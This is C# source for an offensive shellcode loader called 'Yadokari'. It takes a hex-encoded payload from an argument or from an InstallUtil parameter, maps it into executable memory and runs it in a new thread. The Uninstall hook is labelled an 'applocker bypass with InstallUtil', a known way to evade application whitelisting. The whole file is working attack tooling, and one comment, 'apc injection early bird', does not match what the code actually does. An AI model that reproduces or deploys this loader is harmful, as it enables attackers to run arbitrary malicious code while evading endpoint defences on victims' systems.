using System;
using System.Diagnostics;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;

using static Yadokari.Native;

namespace Yadokari
{
    class Program
    {
        static void Main(string[] args)
        {
            string payload = "";
            if (args.Length > 0)
            {
                payload = args[0];
            }
            Injector.Run(payload);
        }
    }

    // applocker bypass with InstallUtil
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string payload = "";
            if (this.Context.Parameters.ContainsKey("payload"))
            {
                payload = this.Context.Parameters["payload"];
            }
            Injector.Run(payload);
        }
    }

    public class Injector
    {

        public static void Run(string payload)
        {
            IntPtr hProcess = IntPtr.Zero;

            byte[] buf = hexToBytes(payload);
            hProcess = Process.GetCurrentProcess().Handle;

            RemoteMapInject(hProcess, buf);
        }

        private static byte[] hexToBytes(string hex)
        {
            int size = hex.Length / 2;
            byte[] buf = new byte[size];

            for (int i = 0; i < size; i++)
            {
                buf[i] = Convert.ToByte(hex.Substring(i*2, 2), 16);
            }

            return buf;
        }
        
        // apc injection early bird
        private static void RemoteMapInject(IntPtr hProcess, byte[] buf)
        {
            bool bState = false;
            IntPtr hFile = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;
            IntPtr pMapLocalAddress = IntPtr.Zero;
            IntPtr pMapRemoteAddress = IntPtr.Zero;
            hFile = CreateFileMapping(IntPtr.Zero, IntPtr.Zero, 0x40, 0, (uint)buf.Length, null);
            if (hFile == IntPtr.Zero)
            {
                Console.WriteLine($"[!] CreateFileMapping failed with error: {Marshal.GetLastWin32Error()}");
                goto _CLEANUP;
            }

            pMapLocalAddress = MapViewOfFile(hFile, 0x0002, 0, 0, (uint)buf.Length);
            if (pMapLocalAddress == IntPtr.Zero)
            {
                Console.WriteLine($"[!] MapViewOfFile failed with error: {Marshal.GetLastWin32Error()}");
                goto _CLEANUP;
            }

            Marshal.Copy(buf, 0, pMapLocalAddress, buf.Length);

            
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[!] GetCurrentProcess failed with error: {Marshal.GetLastWin32Error()}");
                goto _CLEANUP;
            }
            pMapRemoteAddress = MapViewOfFileNuma2(hFile, hProcess, 0, IntPtr.Zero, 0, 0, 0x20, 0xffffffff);
            if (pMapRemoteAddress == IntPtr.Zero) {
                Console.WriteLine($"[!] MapViewOfFileNuma2 failed with error: {Marshal.GetLastWin32Error()}");
                goto _CLEANUP;
            }
            Console.WriteLine($"[+] Remote Mapping Address : 0x{pMapRemoteAddress}");

            hThread = CreateThread(IntPtr.Zero, 0, pMapRemoteAddress, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine($"[!] CreateThread failed with error: {Marshal.GetLastWin32Error()}");
                goto _CLEANUP;
            }
            WaitForSingleObject(hThread, 0xffffffff);
            bState = true;
        _CLEANUP:
            if (hFile != IntPtr.Zero)
            {
                CloseHandle(hFile);
            }

            if (hProcess != IntPtr.Zero)
            {
                CloseHandle(hProcess);
            }
            if (hThread != IntPtr.Zero)
            {
                CloseHandle(hThread);
            }

        }

    } 
}
